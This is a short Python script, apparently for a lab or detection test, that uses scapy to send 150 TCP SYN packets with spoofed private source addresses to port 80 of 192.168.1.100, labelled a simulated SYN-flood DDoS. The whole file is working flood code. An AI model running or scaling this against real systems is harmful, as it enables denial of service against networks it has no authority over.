#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.inet import IP, TCP
import random

print("[*] 🔥 Simulating DDoS Attack (SYN Flood)...")

try:
    for _ in range(150):
        ip = IP(src=f"192.168.1.{random.randint(1,200)}", dst="192.168.1.100")
        tcp = TCP(sport=random.randint(1024,65535), dport=80, flags="S")
        send(ip/tcp, verbose=0)
    print("[+] DDoS Simulation Complete! 150 packets sent.")
except Exception as e:
    print(f"[-] Error: {e}")